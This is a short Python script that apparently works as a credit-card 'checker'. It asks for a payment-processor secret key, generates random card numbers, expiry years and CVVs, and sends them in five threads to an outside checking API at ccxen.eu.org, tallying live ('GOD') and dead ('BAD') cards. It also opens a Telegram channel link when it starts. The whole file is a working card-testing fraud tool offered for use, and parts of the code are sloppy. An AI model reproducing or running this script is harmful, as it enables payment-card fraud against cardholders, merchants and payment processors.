import requests,os
import random,threading
os.system('xdg-open https://t.me/mafia16xv/GxXSKnGiEYD8TPUBfWme05')
#from emoji import emojize
#print(emojize(':black_heart:'*497))
#print(emojize(':red_heart:'*497))
#print(emojize(':yellow_heart:'*497))


print('_'*40)
sk =input('[✓] SK : ')

G=0
A=0
user='1234567890'
def SSS():
	global G,A
	while True:
			N=''.join(random.choice(user)for i in range(16))
			V= random.choice(['2023','2024','2025','2026','2027','2028','2029'])
			B=''.join(random.choice(user)for i in range(3))
			kard = N+'|'+V+'|'+B
			url = f"https://ccxen.eu.org/v1/api/skbased.php?lista={kard}&amt=0.8&tgid=&type=cvv&sk={sk}=usd&forward=hit"
			headers =  {
			    "accept": "*/*",
			    "accept-language": "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
			    "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
			    "sec-ch-ua-mobile": "?0",
			    "sec-ch-ua-platform": "\"Linux\"",
			    "sec-fetch-dest": "empty",
			    "sec-fetch-mode": "cors",
			    "sec-fetch-site": "same-origin",
			    "x-requested-with": "XMLHttpRequest"
			  }
			data = {
			'authority':'ccxen.eu.org',
			'method':'GET',
			'path':f'/v1/api/skbased.php?lista={kard}&amt=0.8&tgid=&type=cvv&sk={sk}&curr=usd&forward=hit',
			'scheme':'https',
			'accept':'*/*',
			'accept-encoding':'gzip, deflate, br',
			'accept-language':'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			}
			SIN = requests.get(url,headers=headers,data=data).text
			if 'DEAD' in SIN:
				G+=1
				
				
				os.system('cls'if os.name=='net'else'clear')
				print(f'''
	[✓] GOD : {A}
	[×] BAD  :  {G}
	[∆] CARD : {kard}''')
				
				
			else:
				A+=1
				
				os.system('cls'if os.name=='net'else'clear')
				print(f'''
	[✓] GOD : {A}
	[×] BAD  :  {G}
	[∆] CARD : {kard}''')
				
	
Threads=[] 
for t in range(5):
 x = threading.Thread(target=SSS)
 x.start()
 Threads.append(x)
for Th in Threads:
 Th.join()
SSS()
	
	  
